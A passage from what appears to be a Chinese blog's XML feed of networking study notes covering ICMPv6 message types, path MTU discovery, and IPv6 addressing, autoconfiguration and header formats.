style="color:blue;">ICMPv6与ICMPv4是两个不同的协议，两个版本的ICMP并不兼容</p></blockquote><p>ICMPv6增加的功能包括:</p><ul><li><ul><li>IGMP、ARP、RARP功能被加入到ICMPv6中。</li><li>引入了<strong>邻居发现(Neighbor Discovery)协议</strong>，实现了路由器和前缀发现、地址解析地址自动配置、下一跳地址确定、邻居可达性检测、重复地址检测、重定向等功能</li><li>ICMPv6还支持Mobile lPv6</li></ul></li></ul><h3 id="ICMPv6协议报文格式"><a href="#ICMPv6协议报文格式" class="headerlink" title="ICMPv6协议报文格式"></a>ICMPv6协议报文格式</h3><p>ICMPv6报头由其前一个报头中的下一个报头字段值58来标识。</p><img src="./IPv6协议结构/ICMPv6报文的一般格式.png" style="zoom:67%;" /><center>ICMPv6报文的一般格式</center><img src="./IPv6协议结构/携带ICMPv6分组的报文格式.png" style="zoom:50%;" /><center>携带ICMPv6分组的报文格式</center>#### 各字段含义<ul><li>类型:8位，标识ICMPv6报文的类型，决定了报文剩余部分的格式</li><li>代码:8位，取决于报文类型，在特定情况下提供更多详细的信息，标识报文类型下一层次的作用</li><li>校验和:16位，对ICMPv6首部和部分IPv6首部中数据的正确性进行检验</li><li>报文主体:对于不同的类型和代码，包含不同的数据。如果是错误报文，则可包含用来帮助故障排除的尽可能多的信息。但<strong>ICMPv6数据包的总大小不能超过IPv6的MTU的最小值1280</strong></li></ul><h3 id="ICMPv6报文类型"><a href="#ICMPv6报文类型" class="headerlink" title="ICMPv6报文类型"></a>ICMPv6报文类型</h3><h4 id="ICMPv6差错报文"><a href="#ICMPv6差错报文" class="headerlink" title="ICMPv6差错报文"></a>ICMPv6差错报文</h4><ul><li>差错报文是由目标节点或中间路由器发送的，用于报告在转发或传送IPv6数据包过程中出现的错误。在所有的ICMPv6差错报文中，8位类型字段中的最高位都为0。因此，类型字段的范围是0~127。</li></ul><h5 id="目的地址失效差错报文"><a href="#目的地址失效差错报文" class="headerlink" title="目的地址失效差错报文"></a>目的地址失效差错报文</h5><blockquote><p style="color:blue;">当数据包无法被转发到目标节点或上层协议时，路由器或目标节点发送ICMPv6目的地址失效差错报文</p></blockquote><img src="./IPv6协议结构/目的地址失效差错报文.png" style="zoom:67%;" /><img src="./IPv6协议结构/目的地址失效差错报文代码值.png" style="zoom: 80%;" /><h5 id="包过大差错报文"><a href="#包过大差错报文" class="headerlink" title="包过大差错报文"></a>包过大差错报文</h5><blockquote><p style="color:blue;">数据包无法转发是由于路由器的转发接口的链路MTU小于IPv6数据包的长度，就要发送ICMPv6包过大报文</p></blockquote><ul><li>该ICMPv6错误报文中有一个字段指出导致该问题的链路的MTU值</li></ul><img src="./IPv6协议结构/包过大差错报文.png" style="zoom:67%;" /><h5 id="超时报文"><a href="#超时报文" class="headerlink" title="超时报文"></a>超时报文</h5><ul><li>代码为0:当IPv6报头中的跳数限制字段在转发过程中减小为0时，路由器发送ICMPv6超时报文</li><li>代码为1:当目标主机的分片重组定时器超时，目标主机发送，RFC2460规定分片重组时间为60秒</li></ul><img src="./IPv6协议结构/报文超时差错报文.png" style="zoom:67%;" /><h5 id="参数问题"><a href="#参数问题" class="headerlink" title="参数问题"></a>参数问题</h5><blockquote><p>当IPv6报文或扩展报头出现错误，从而导致IPv6不能进行进一步处理时，发送该报文。该报文由路由器或者目标节点发送</p></blockquote><ul><li>代码为0表示遇到错误的报头字段</li><li>代码为1表示遇到无法识别的下一个报头类型</li><li>代码为2表示遇到无法识别的IPv6选项。</li></ul><blockquote><p style="color:blue;">指针字段指出了IPv6数据包中错误发生的位置，其值为从0开始的字节偏移量</p></blockquote><h4 id="ICMPv6信息报文"><a href="#ICMPv6信息报文" class="headerlink" title="ICMPv6信息报文"></a>ICMPv6信息报文</h4><ul><li>信息报文提供诊断功能和附加的主机功能，比如多播侦听发现(MLD）协议和邻居发现协议。在所有的ICMPv6信息报文中，8位类型字段中的最高位都为1。因此，类型字段的范围是128～255。</li></ul><img src="./IPv6协议结构/ICMPv6信息报文与差错报文.png" style="zoom: 67%;" /><h5 id="回送请求报文"><a href="#回送请求报文" class="headerlink" title="回送请求报文"></a>回送请求报文</h5><ul><li>ICMPv6回送请求报文用于发送至目标节点，以请求目标节点立即发回一个回送应答报文</li><li>发送方主机设置标识符字段和序列号字段，用于将收到的回送应答报文与发送的回送请求报文进行匹配</li></ul><img src="./IPv6协议结构/回送请求报文.png" style="zoom:67%;" /><h5 id="回送应答报文"><a href="#回送应答报文" class="headerlink" title="回送应答报文"></a>回送应答报文</h5><ul><li>ICMPv6回送应答报文用于响应接收到的ICMPv6回送请求报文</li><li>回送应答报文的标识符字段，序列号字段和数据字段的值被置为与回送请求报文中的相应字段一样的值</li></ul><img src="./IPv6协议结构/回送应答报文.png" style="zoom:67%;" /><h3 id="ICMP处理规则"><a href="#ICMP处理规则" class="headerlink" title="ICMP处理规则"></a>ICMP处理规则</h3><blockquote><p>如果节点收到一条未知类型的ICMPv6错误报文，必须把它传送给上层协议</p></blockquote><blockquote><p>如果节点收到一条未知类型的ICMPv6信息报文，必须将其丢弃</p></blockquote><p>每一个ICMPv6差错报文（类型&lt;128）在不超过最小IPv6 MTU的情况下，包括尽可能大的引起出错的包。</p><p>网络层协议把ICMPv6差错报文传送到上层协议的进程时，原包中的上层协议字段被取出，用来选择合适的上一层进程来处理错误。如果原包含有一个很大的扩展首部，那么有可能上层协议类型并没有包含在ICMPv6差错报文中。原因是为了满足最小IPv6 MTU的限制，原包被切断了。这种情况下，差错报文在任何IPv6层处理后被丢弃。</p><p>如果接收到的数据包为下列情况之一，则不发送ICMPv6差错报文:</p><pre class="line-numbers language-none"><code class="language-none">ICMPv6错误报文，一个ICMPv6重定向报文，一个发往多播地址的，链路层多播包，链路层广播包，一个源地址不能唯一确定某个单独节点的数据包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对上述情况，存在两个例外，即包过大报文和代码为2，表示不可识别的lPv6选项的参数问题报文。</p><h4 id="路径MTU发现"><a href="#路径MTU发现" class="headerlink" title="路径MTU发现"></a>路径MTU发现</h4><h5 id="lPv6-MTU"><a href="#lPv6-MTU" class="headerlink" title="lPv6 MTU"></a>lPv6 MTU</h5><ul><li>IPv6要求链路层的最小MTU为1280字节，建议MTU长度最小为1500字节</li><li><strong>PMTU:从源到目的节点的所有链路上最小的链路MTU</strong></li><li><strong>PMTU发现的目的是为了确保可以使用某个路径上支持的最大可能的大小来发送数据包</strong></li></ul><h5 id="路径MTU发现工作过程"><a href="#路径MTU发现工作过程" class="headerlink" title="路径MTU发现工作过程"></a>路径MTU发现工作过程</h5><ul><li>首先主机假定PMTU与第一跳链路的MTU相同，并且使用该大小发送数据包</li><li>如果该数据包对于路径中某个路由器过大，路由器丢弃该数据包并返回类型为“数据包过大”的ICMPv6消息，且该消息中包含下一跳链路的MTU大小</li><li>主机使用这个MTU来把后续的包发往同一目的地。主机发送的数据包肯定不会小于IPv6的最小MTU (1280 Bytes)</li><li>重复上述过程，直到数据包到达目的地。</li></ul><h5 id="PMTU的改变"><a href="#PMTU的改变" class="headerlink" title="PMTU的改变"></a>PMTU的改变</h5><ul><li>由于路由拓扑结构的变化，源节点和目标节点之间的路径会随着时间而改变。·路径MTU的减小，可以通过接收到的ICMPv6包过大报文被立即发现。而路径MTU的增大，则必须通过发送方的检测才能发现。根据RFC1981，发送方可以通过试图发送更长的数据包来进行检测。而这种检测应该在距离接收到ICMPv6包过大报文最少5分钟(建议取10分钟)之后进行</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6协议结构</title>
      <link href="/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="网络协议分析-IPv6协议部分"><a href="#网络协议分析-IPv6协议部分" class="headerlink" title="网络协议分析    IPv6协议部分"></a>网络协议分析    IPv6协议部分</h2><p>[TOC]</p><h3 id="网络协议分析之IPv6协议基础"><a href="#网络协议分析之IPv6协议基础" class="headerlink" title="网络协议分析之IPv6协议基础"></a>网络协议分析之IPv6协议基础</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握IPv6协议栈的常用命令</span><span class="token comment">#掌握lPv6单播地址的使用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="IPv6的特征："><a href="#IPv6的特征：" class="headerlink" title="IPv6的特征："></a>IPv6的特征：</h4><h4 id="IPv6地址："><a href="#IPv6地址：" class="headerlink" title="IPv6地址："></a>IPv6地址：</h4><h5 id="IPv6地址空间："><a href="#IPv6地址空间：" class="headerlink" title="IPv6地址空间："></a>IPv6地址空间：</h5><img src="./IPv6协议结构/IPv6地址空间分配情况.png" style="zoom:67%;" /><center>IPv6地址空间分配情况</center>> <p style="color:blue;">IPv6地址有三种表示形式：首选地址，压缩格式和内嵌IPv4的IPv6地址格式</p><p><strong>首选格式</strong>：</p><blockquote><p>128位地址用16位边界分成8组，每个组转换成4位十六进制数用冒号分隔，称为冒号十六进制</p></blockquote><p><strong>压缩格式</strong>：</p><blockquote><p style="color:blue;">零压缩:连续为0的组可以压缩为::(双冒号)</p></blockquote><p>删除每组的前导0， 把连续的一段0压缩为:: ，在一个IPv6地址中::只能出现一次 </p><blockquote><p style="color:blue;">零压缩只能在给定地址中使用一次，不能使用零压缩来包括某个组的一部分</p></blockquote><p><strong>IPv4的IPv6地址格式：</strong></p><blockquote><p style="color:black;">在IPv4和IPv6的混合环境中，IPv6地址中的最低32位可以用于表示lPv4地址，即:X:X:X:X:X:d.d.d.d，其中X表示16进制整数，而d表示十进制整数</p></blockquote><h5 id="IPv6格式前缀-FP-Format-Prefix"><a href="#IPv6格式前缀-FP-Format-Prefix" class="headerlink" title="IPv6格式前缀(FP, Format Prefix)"></a>IPv6格式前缀(FP, Format Prefix)</h5><ul><li>类似于IPv4中的CIDR表示法，IPv6地址被分成两个部分：子网前缀和接口标识符</li><li>IPv6地址前缀格式为:IPv6地址/前缀长度<ul><li>1030:0:0:0:C9B4:FF12:48AA:1A2B/60，用于路由的前缀长度为60位。</li><li>前缀是地址的一部分，这部分或者有固定的值，或者是路由或子网的标识。64位前缀用来表示节点所在的单个子网，所有子网都有相应的64位前缀。任何少于64位的前缀,或者是一个路由前缀，或者是包含了部分IPv6地址空间的一个地址范围</li></ul></li></ul><h4 id="IPv6地址结构"><a href="#IPv6地址结构" class="headerlink" title="IPv6地址结构"></a>IPv6地址结构</h4><img src="./IPv6协议结构/IPv6地址结构.png" style="zoom:67%;" /><ul><li>全球路由前缀:识别分配给一个站点的某个特殊地址或地址范围</li><li>子网ID:用于识别站点中的某个链路，一个子网ID与一个链路相关联，也可以将多个子网ID分配给一个链路</li><li>接口ID:用于识别和指明链路上的一个接口，并且接口ID在该链路上必须是唯一的</li></ul><p><strong>接口标识的生成</strong>：由IEEE EUI - 64规范自动生成，设备随机生成，或手工配置。</p><p><strong>EUI - 64规范(Extended Unique ldentifier)</strong></p><ul><li>将48比特的MAC地址转化为64比特的接口标识，因此理论上可多达264个不同的物理接口</li><li>转换方法:在MAC地址的中间插入4位16进制数FFFE，再把从最高位开始的第7位U/L位取反（置1)</li></ul><img src="./IPv6协议结构/EUI-64规范.png" style="zoom:67%;" /><h5 id="IPv6地址的分配"><a href="#IPv6地址的分配" class="headerlink" title="IPv6地址的分配"></a>IPv6地址的分配</h5><p><strong>IPv6地址是分配给接口的，在IPv6网络中一个接口可以有一个或多个IPv6地址(单播地址、任播地址和多播地址)</strong></p><blockquote><p style="color:blue;">一个节点的每个接口都需要至少一个单播地址。同时，一个单播地址只能与一个网络接口相关联</p></blockquote><h5 id="IPv6地址类别"><a href="#IPv6地址类别" class="headerlink" title="IPv6地址类别"></a>IPv6地址类别</h5><p>**单播地址(Unicast Address)**：用来标识单一网络接口。送往一个单播地址的包将被传送至该地址标识的接口上。</p><p>**组播地址(Multicast Address)**：用来标识一组网络接口(通常属于不同的节点)。送往一个组播地址的包将被传送至有该地址标识的所有接口上。<br>**任播（泛播）地址(Anycast Address)**：用来标识一组网络接口。送往泛播地址的包将被传送至该地址标识的接口之一(路由距离“最近”的接口)。它是IPv6引入的新的地址类型。</p><h4 id="单播地址"><a href="#单播地址" class="headerlink" title="单播地址"></a>单播地址</h4><blockquote><p style="color:orange;">单播地址包括全球单播地址、链路本地地址、站点本地地址、特殊地址、兼容地址、NSAP地址</p></blockquote><h5 id="可聚类全球单播地址"><a href="#可聚类全球单播地址" class="headerlink" title="可聚类全球单播地址"></a>可聚类全球单播地址</h5><p>相当于IPv4公共地址，有3个部分:</p><ul><li><p>ISP分配的前缀</p></li><li><p>站点拓扑，组织机构使用ISP分配的一个<strong>48位前缀</strong>，可以用前缀的49—64位共16位把网络划分为子网，最多可以划分65535个子网</p></li><li><p>接口ID:低64位用于标识接口</p></li></ul><p><strong>全球单播地址报文格式：</strong></p><ul><li>FP字段:格式前缀，3位，目前值为”001”，标识这是可集聚全球单播地址</li><li>TLAID字段:顶级集聚标识符，13位，包含最高级地址选路信息，即网络互连中最大的选路信息，可得到最大8192个不同的顶级路由</li><li>RES字段:8位，保留。最终可能会用于扩展顶级或下一级集聚标识符字段。</li><li>NLAID字段:下一级集聚标识符，24位，该标识符被一些机构用于控制顶级集聚以安排地址空间，这些机构能按照他们自己的寻址分级结构来将此24位字段切开用</li><li>SLAID字段:站点级集聚标识符，16位，获得48位前缀的组织机构用来安排内部网络结构，若字段全部用作平面地址空间，则最多可有65535个不同子网</li><li>接口标识符字段:64位，IEEE EUI-64接口标识符</li></ul><img src="./IPv6协议结构/全球单播地址报文格式.png"  /><h5 id="链路本地地址-Link-local"><a href="#链路本地地址-Link-local" class="headerlink" title="链路本地地址(Link-local)"></a>链路本地地址(Link-local)</h5><blockquote><p style="color:orange;">链路本地地址具有固定的地址格式，由设备自动生成，范围限制在同一本地链路的节点之间，在邻居发现等IPv6机制中或者没有路由器的网络上用到该类型的地址</p></blockquote><ul><li><p>链路本地地址的组成包括一个特定的前缀<strong>FE80::/64</strong>和低64位的EUI-64接口ID</p></li><li><p>节点启动IPv6协议栈时，节点的每个接口会自动分配一个链路本地地址，这种机制的特点是连接在同一链路上的两个IPv6节点不需要做任何配置就可以通信</p></li><li><p>路由器在源端和目的端对具有链路本地地址的包不予处理，因为永远也不会转发这些包</p></li></ul><img src="./IPv6协议结构/链路本地地址.png"  /><p>在lPv6中，一个有可聚类全球单播地址的节点在本地链路上，使用默认IPv6路由器的链路本地地址，而不使用路由器的可聚类全球单播地址。如果必须发生网络重新编址，即单播可聚类全球前缀更改为一个新的单播可聚类全球前缀时，总能使用链路本地地址到达默认路由器。在网络重新编址过程中，节点和路由器的链路本地地址不会发生变化</p><h5 id="站点本地地址-Site-local"><a href="#站点本地地址-Site-local" class="headerlink" title="站点本地地址(Site-local)"></a>站点本地地址(Site-local)</h5><blockquote><p style="color:red;">站点本地地址也是应用范围受限的地址，类似于IPv4专用地址，可供没有申请到可聚类全球单播地址的组织机构使用</blockquote><ul><li>站点本地地址不是自动生成的</li><li>前48位是固定的，其中前10位是固定的二进制位组合1111111011，后面是38位0(FEC0:/48)，接着是提供单位构建子网的16位的子网ID字段，最后是EUI-64接口ID</li><li>站点本地地址能用在内联网中传送数据，但不允许从站点直接选路到全球Internet。站点内的路由器只能在站点内转发包，而不能把包转发到站点外去。 </li></ul><img src="./IPv6协议结构/站点本地地址.png"  /><h5 id="特殊地址和保留地址"><a href="#特殊地址和保留地址" class="headerlink" title="特殊地址和保留地址"></a>特殊地址和保留地址</h5><ul><li>IPv6地址空间中，第一个1/256的大部分空的地址空间用作特殊地址，包括:<ol><li>未指定地址:全0地址，当没有有效地址时，可采用该地址。作为源地址使用，不能被路由器转发。可以表示为0:0:0:0:0:0:0:0或::</li><li>回返地址:除了最低位外，全为0，即0:0:0:0:0:0:0:1或::1。</li><li>嵌有IPv4地址的IPv6地址:一类允许IPv6节点访问不支持IPv6的IPv4节点（IPv4映象地址)，另一类允许IPv6路由器用隧道方式，在IPv4网络上传送IPv6包(IPv4兼容地址)</li></ol></li><li>NSAP和IPX地址分配<ul><li>lPng的目标之一是要统一整个网络世界，使IP、IPX和OSI网络间能进行互操作。为了支持这种互操作性，IPv6为OSI和IPX各保留了1/128地址空间。IPX地址格式尚未精确定义</li><li>NSAP地址分配的描述见RFC1888 (OSI NSAP和IPv6)</li></ul></li></ul><h4 id="多播地址："><a href="#多播地址：" class="headerlink" title="多播地址："></a>多播地址：</h4><blockquote><p style="color:red;">多播指的是源节点发送的单个数据报可以被指明的多个目的节点收到</p></blockquote><ul><li>IPv6协议中的多播地址用最高8位是11111111(FF)来标识多播地址</li><li>多播地址只能用作目的地址。</li></ul><img src="./IPv6协议结构/多播地址.png" style="zoom:67%;" /><ul><li><p>标识字段：地址格式中的第1个字节为全<code>&quot;1&quot;</code>(FF)，标识其为多播地址</p></li><li><p>标志字段：占4位。目前只定义了第4位，用<code>&quot;0&quot;</code>表示该地址是由Internet编号机构指定的熟知多播地址，<code>1</code>表示特定场合使用的临时多播地址</p></li><li><p>范围字段:占4位，用来限制多播数据流在网络中发送的范围，见下表</p></li></ul><img src="./IPv6协议结构/多播地址范围字段.png" style="zoom:67%;" /><ul><li>组标识符字段:占112位，用于标识多播组，最多可以编码2112个组的ID。</li></ul><h5 id="IPv6具有特别含义的特殊多播地址"><a href="#IPv6具有特别含义的特殊多播地址" class="headerlink" title="IPv6具有特别含义的特殊多播地址"></a>IPv6具有特别含义的特殊多播地址</h5><ul><li>FF01::1表示节点本地范围内所有节点多播地址;</li><li>FF02::1表示链路本地范围内所有节点多播地址;</li><li>FF01:2表示节点本地范围内所有路由器多播地址;</li><li>FF02::2表示链路本地范围内所有路由器多播地址;</li><li>FFO5::2表示站点本地范围内所有路由器多播地址。</li><li>IPv6多播地址中有一种特殊用途的<strong>请求节点(Solicited-node)多播地址</strong>，主要用于重复地址检测(DAD)和获取邻居节点的链路层地址。请求节点多播地址由前缀FFO2::1:FFO0:0/104和单播地址的最后24位组成。</li></ul><p>当节点预订多播地址时，它声明要成为多播的一个成员，于是任何本地路由器将以该节点的名义预订多播地址。同一网络上的其他节点要发送信息到该多播地址时，IP多播包将被封装到链路层多播数据传输单元中，发送给每个订户。从本地网以外来的多播，用同样方法处理，只是传递给路由器，由路由器把包转发给预订节点。</p><blockquote><p style="color:black;">路由器不转发广播包，但对多播而言只要路由器以其它节点的名义预订多播地址，就能有选择地转发多播包</blockquote><h4 id="任播地址"><a href="#任播地址" class="headerlink" title="任播地址"></a>任播地址</h4><p>任播地址是IPv6协议特有的地址类型</p><blockquote><p style="color:orange;">多个节点共享一个任播地址，但只有一个节点接收给任播地址的数据报。适合于一对一组中的一个(One to One of Many)的通信需求</p></blockquote><blockquote><p style="color:blue;">任播地址用来标识通常属于不同节点的一组网络接口，路由器把目标地址是任播地址的数据报发送给离该路由器"最近"的一个接口</p></blockquote><ul><li>任播地址只能用作IPv6数据报的目的地址，只能分配给IPv6路由器</li><li>任播对某些类型的服务特别有用，尤其是对于C/S之间不需要有特定关系的服务，如DNS、NTP等</li></ul><p>任播地址是从单播地址空间中划分出来的，与单播地址有相同的格式，当一个单播地址属于多个接口时，就是任播地址。因为任播地址在形式上与单播地址无法区分开，一个任播地址的每个成员，必须显式地加以配置，以便识别任播地址</p><p><strong>子网路由器任播地址格式:</strong></p><blockquote><p>子网前缀部分设置为路由器所在子网的前缀，地址的其余位设置为0，发送到这个地址上的数据包会被发送到该子网中的一个路由器上</p></blockquote><img src="./IPv6协议结构/子网路由器任播地址格式.png" style="zoom: 80%;" /><p><strong>预留的任播地址(RFC 2526)</strong></p><ul><li>在每个子网内，接口标识符值0—127是为子网任播地址分配而保留的，0—125和127为保留，126用于移动lPv6家园代理(Mobile lPv6 Home Agents)的任播</li><li>预留的任播地址不能分配给单播地址，它们的结构按是否含EUl-64分为两类</li></ul><img src="./IPv6协议结构/预留的任播地址.png" style="zoom:100%;" /><p><strong>节点必须的IPv6地址</strong></p><img src="./IPv6协议结构/节点必须的IPv6地址.png" style="zoom:67%;" /><p><strong>路由器必须的IPv6地址：</strong></p><img src="./IPv6协议结构/路由器必须的IPv6地址.png" style="zoom: 70%;" /><h4 id="IPv6地址配置技术"><a href="#IPv6地址配置技术" class="headerlink" title="IPv6地址配置技术"></a>IPv6地址配置技术</h4><h5 id="路由器地址配置"><a href="#路由器地址配置" class="headerlink" title="路由器地址配置"></a>路由器地址配置</h5><p>与IPv4方法类似，管理员手工为接口配置一个IPv6地址，并指定前缀长度</p><h5 id="主机地址配置"><a href="#主机地址配置" class="headerlink" title="主机地址配置"></a>主机地址配置</h5><ul><li>考虑到主机用途的多样性，采用自动配置方法，常用的自动配置技术包括:有状态自动配置协议(DHCPv6)和无状态自动配置协议。</li></ul><p><strong>手工配置和检测</strong></p><ol><li>建议用于服务器和重要网络设备</li><li>接口地址配置的内容包括:128位IPv6地址和前缀长度</li><li>IPv6地址配置到接口上以后，需要检测所配置的地址在链路上是否<strong>唯一</strong><ul><li>IPv6重复地址检测<strong>DAD</strong>，属于邻居发现(ND，Neighbor Discovery)协议的功能</li></ul></li></ol><p><strong>自动配置</strong></p><ul><li>赋予主机自己的地址参数，包括地址前缀、接口ID</li><li>赋予主机其它的相关参数，包括路由器地址、跳数、MTU…</li></ul><p><strong>自动配置过程</strong></p><ol><li><p>接口初始化，然后产生“tentative”(实验性)地址</p></li><li><p>对“tentative”地址进行重复地址检测(DAD)</p></li><li><p>接口产生link-local地址，具备IP连接能力</p></li><li><p>决定采用何种自动配置技术</p><ul><li>由Router Advertisement报文及主机配置来决定</li><li>无状态自动配置(stateless autoconfiguration)</li><li>有状态自动配置(stateful autoconfiguration)</li></ul></li><li><p>获得全球地址</p></li></ol><h5 id="即插即用"><a href="#即插即用" class="headerlink" title="即插即用"></a>即插即用</h5><ul><li>lPv6用两种不同机制来支持即插即用，即BOOTP和DHCP。这些协议支持“状态自动配置”，即服务器必须管理和保存每个节点的状态信息</li></ul><p><strong>有状态自动配置与无状态自动配置</strong></p><ul><li>有状态自动配置的问题在于:用户必须保持和管理特殊的自动配置服务器以管理所有“状态”</li><li>对于个人或者小型机构，无状态自动配置是较容易的解决方案。这种机制允许个人节点确定自己的IP配置，而不必向服务器显式请求各节点的信息</li></ul><h5 id="同时使用无状态及有状态两种配置方式"><a href="#同时使用无状态及有状态两种配置方式" class="headerlink" title="同时使用无状态及有状态两种配置方式"></a>同时使用无状态及有状态两种配置方式</h5><ul><li>两种类型自动配置方式的合作比单独使用其中一种更易于实现Internet网络连接的即插即用<ul><li>可以使用无状态自动配置生成一个IPv6地址，然后对附加参数使用有状态的自动配置</li></ul></li><li>无状态自动配置要简单的多，为什么还要使用状态自动配置?<ul><li>无状态自动配置对得到IP地址的节点提供最低程序的监视，任一节点可以连接到链路，通过路由器通告来获知网络和子网信息，并构造有效的链路地址</li><li>如果有DHCP服务器的支持，那么机构可以更紧密地控制网络可配置的节点。同时，只有由网络管理员明确授权的节点才能通过DHCP服务器来配置</li></ul></li></ul><h3 id="IPv6协议结构"><a href="#IPv6协议结构" class="headerlink" title="IPv6协议结构"></a>IPv6协议结构</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握IPv6的报头格式#掌握分片报头的格式及用途#理解IPv6数据包的拆分、重组过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="IPv6数据包结构"><a href="#IPv6数据包结构" class="headerlink" title="IPv6数据包结构"></a>IPv6数据包结构</h4><blockquote><p style="color:orange;">由固定首部(base header)和有效载荷(payload)组成：首部长度变为固定的40字节，称为基本首部，所有的扩展首部和上层数据合起来叫做数据报的有效载荷或净负荷</p></blockquote><ul><li>取消不必要的功能，首部的字段数减少到只有8个</li><li>取消了首部检验和字段，加快了路由器处理数据报的速度</li><li>基本首部的后面允许有零个或多个扩展首部。</li></ul><img src="./IPv6协议结构/IPv6数据结构.png" style="zoom:67%;" /><img src="./IPv6协议结构/IPv6数据包结构示意图.png" style="zoom: 50%;" /><center>IPv6数据包结构示意图</center>#### 基本首部<h5 id="基本首部各字段含义："><a href="#基本首部各字段含义：" class="headerlink" title="基本首部各字段含义："></a>基本首部各字段含义：</h5><ul><li>版本:4位，指明了协议的版本，对IPv6该字段总是6。</li><li>区分服务:8位，以前叫做通信流类别，6表示IPv6数据包的类或优先级。类似于IPv4的服务类型字段。</li><li>流标号:20位，流是互联网络上从特定源点到特定终点的一系列数据报。数据流由流标号和源节点的地址唯一标识。所有属于同一个流的数据报都具有同样的流标号、源lP地址和目的IP地址</li><li>有效载荷长度:16位，指明IPv6数据报除基本首部以外的字节数（所有扩展首部都算在有效载荷之内），其最大值是64KB。如果使用逐跳选项扩展头的特大净荷选项，就能传送更大的数据包，此时有效载荷长度置0</li><li>下一个首部:8位，如果IPv6数据报没有扩展首部，它相当于IPv4的协议字段;如果IPv6数据报有扩展首部，它指出第一个扩展首部的类型</li><li>跳数限制:8位，与IPv4的TTL类似。源节点在数据报发出时即设定跳数限制。路由器在转发数据报时将跳数限制字段中的值减1。当跳数限制的值为零时，将此数据报丢弃</li><li>源地址:128位，定义了源主机的IP地址</li><li>目的地址:128位，定义了目的主机的IP地址。如果出现路由头，这个地址不是最终的接收数据包的主机的IPv6地址，而是路由报头列表中的第一个路由器地址</li></ul><img src="./IPv6协议结构/IPv6数据结构与IPv4的对比.png" style="zoom: 50%;" /><h4 id="IPv6拓展首部："><a href="#IPv6拓展首部：" class="headerlink" title="IPv6拓展首部："></a>IPv6拓展首部：</h4><ul><li>它代替了IPv4报头及其选项，增强了IPv6的功能，使其可以支持未来的需求</li><li>扩展首部留给路径两端的源站和目的站主机来处理，中间路由器都不处理扩展首部（除路由选择和逐跳选项扩展首部)，大大提高了路由器的处理效率</li><li>lPv6数据包中可以包含零个或多个具有不同的长度扩展报头。IPv6报头中的下一个报头字段，指向第一个扩展报头。每个扩展报头中，都包含下一个报头字段，指向下一个扩展报头。最后一个扩展报头指出上层协议数据单元的类型，上层协议可以是TCP协议、UDP协议或者ICMPv6协议等。</li></ul><img src="./IPv6协议结构/无扩展首部.png" style="zoom:80%;" /><img src="./IPv6协议结构/有扩展首部.png" style="zoom: 67%;" /><h5 id="六种扩展首部："><a href="#六种扩展首部：" class="headerlink" title="六种扩展首部："></a>六种扩展首部：</h5><p><strong>逐跳选项扩展首部</strong>(Hop-by-Hop Options Header)，<strong>路由选择扩展首部</strong>(Routing Header)，<strong>分片扩展首部</strong>(Fragment Header)，<strong>认证扩展首部</strong>(Authentication Header)，<strong>目的站选项扩展首部</strong>(Destination Header)和封装<strong>安全有效载荷扩展首部</strong>(Encapsulated Security Payload Header)</p><blockquote><p style="color:blue;">注:每个扩展首部的长度应为8个字节的整数倍，是为了满足扩展首部对齐的要求</p></blockquote><h5 id="逐跳选项扩展首部"><a href="#逐跳选项扩展首部" class="headerlink" title="逐跳选项扩展首部"></a>逐跳选项扩展首部</h5><ul><li>逐跳选项扩展首部中最实质的是逐跳选项字段的内容，该字段描述了数据分组转发的特性。从源节点到目的节点的路由上的每个节点，即每个转发包(数据报)的路由器都检查逐跳选项中的信息</li><li>由于它需要每个中间路由器进行处理，所以只在绝对必要的时候才会出现</li><li>必须紧跟在IPv6基本首部后，若存在逐跳选择首部，基本首部中下一个首部字段值为0</li></ul><p><strong>逐跳选项：</strong></p><ul><li>巨型净荷选项:净荷超过65535字节</li><li>路由器警告选项:用于多播侦听发现和资源存储协议</li></ul><blockquote><p>RFC2460中已经将这两个选项废弃。</p></blockquote><img src="./IPv6协议结构/逐跳扩展首部结构.png"  /><h5 id="路由选择扩展首部"><a href="#路由选择扩展首部" class="headerlink" title="路由选择扩展首部"></a>路由选择扩展首部</h5><p>路由选择扩展首部代替了IPv4中所实现的源选路。源选路允许用户指定数据报的路径，即到达目的地沿途必须经过的路由器<br>·前一个首部中的<code>下一个首部</code>的<strong>字段值为43</strong></p><blockquote><p>RFC2460中定义了一种类型，即类型0，只有列表中的路由器才处理路由选择扩展首部，其它路由器不必处理</p></blockquote><img src="./IPv6协议结构/路由选择扩展首部.png" style="zoom: 80%;" /><p><strong>路由选择扩展操作过程</strong></p><ul><li>源节点构造数据报必须经过的路由器列表，构造类型0选路首部（路由器列表、最终目的地址、剩余段数)</li><li>IPv6基本首部的目的地址是路由器列表中的第一个路由器地址,而不是包的最终目的地址。最终目的地址是路由选择扩展首部数据字段的最后一个地址</li><li>在地址列表中的节点接收到该包之后，对IPv6基本首部和路由选择扩展首部进行处理:<ul><li>剩余段数为0，则此路由器节点是该包的最终目的地址</li><li>若此节点不是该包的最终目的地址，将它自己的地址从IPv6首部目的地址字段取出，用路由选择列表中的下一个节点地址代替，同时将剩余段数字段值减1，并把包发送到下一个节点</li><li>重复此过程，直到包到达其最终目的地址。</li></ul></li></ul><h5 id="分段扩展首部"><a href="#分段扩展首部" class="headerlink" title="分段扩展首部"></a>分段扩展首部</h5><blockquote><p 